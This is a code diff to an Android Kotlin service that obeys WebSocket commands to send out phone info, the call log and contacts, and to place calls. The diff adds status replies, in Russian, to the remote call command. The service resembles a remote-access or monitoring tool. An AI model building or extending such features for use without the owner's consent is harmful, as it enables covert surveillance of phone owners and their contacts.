@@ -331,7 +331,7 @@ class StreamingService : Service() {
                             "get-phone-info" -> sendPhoneInfo(ws)
                             "get-call-log"   -> sendCallLog(ws)
                             "get-contacts"   -> sendContacts(ws)
-                            "call"           -> makeCall(json.optString("number", ""))
+                            "call"           -> makeCall(json.optString("number", ""), ws)
                         }
                     } catch (_: Exception) {}
                 }
@@ -482,22 +482,26 @@ class StreamingService : Service() {
         }
     }
 
-    private fun makeCall(number: String) {
-        if (number.isBlank()) return
+    private fun makeCall(number: String, ws: WebSocket) {
+        fun status(ok: Boolean, msg: String) =
+            ws.send(JSONObject().put("type", "call-status").put("ok", ok).put("msg", msg).toString())
+        if (number.isBlank()) { status(false, "Номер не указан"); return }
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE)
-            != PackageManager.PERMISSION_GRANTED) return
+            != PackageManager.PERMISSION_GRANTED) { status(false, "Нет разрешения на звонок"); return }
         val cleaned = number.trim()
         try {
             val telecom = getSystemService(TELECOM_SERVICE) as? android.telecom.TelecomManager
             if (telecom != null) {
-                val uri = Uri.fromParts("tel", cleaned, null)
-                telecom.placeCall(uri, android.os.Bundle())
+                telecom.placeCall(Uri.fromParts("tel", cleaned, null), android.os.Bundle())
             } else {
                 val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$cleaned"))
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivity(intent)
             }
-        } catch (_: Exception) {}
+            status(true, "Звонок на $cleaned…")
+        } catch (e: Exception) {
+            status(false, "Ошибка: ${e.message ?: "неизвестная"}")
+        }
     }
 
     // ── CameraX binding & switching ────────────────────────────────────────
